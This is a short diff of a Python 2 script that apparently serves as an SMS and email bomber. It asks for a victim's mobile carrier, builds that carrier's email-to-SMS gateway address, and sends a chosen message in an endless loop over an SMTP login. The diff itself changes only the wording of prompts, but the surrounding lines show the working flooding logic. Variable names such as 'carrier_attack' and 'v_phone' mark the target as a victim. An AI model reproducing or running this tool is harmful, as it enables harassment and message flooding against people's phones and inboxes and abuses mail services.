@@ -25,7 +25,7 @@ option = input()
 print("\n\r")
 if option == 1:
     carrier_attack = 0
-    print """ What is their carrier? Respond with the corresponding number
+    print """ What İs Their Carrier ? Respond With The Corresponding Number
 	1. Alltel
 	2. AT&T
 	3. Rogers
@@ -57,14 +57,14 @@ if option == 1:
     if carrier == 9:
 	carrier_attack = "@sms.orange.pl"
 
-    v_phone = raw_input("Phone Number: ") + str(carrier_attack)
-    message = raw_input("Message: ")
+    v_phone = raw_input("Phone Number : ") + str(carrier_attack)
+    message = raw_input("Message : ")
     phone_message = ("From: %s\r\nTo: %s \r\n\r\n %s"
        % (username, "" .join(v_phone), "" .join(message)))
 
     while 1:
         obj.sendmail(username, v_phone, phone_message)
-	print "Message sent! Sending another.. Press Ctrl + C to stop."
+	print "Message sent! Sending Another.. Press Ctrl + Z to stop."
 
 if option == 2:
     v_email = raw_input("Email: ")
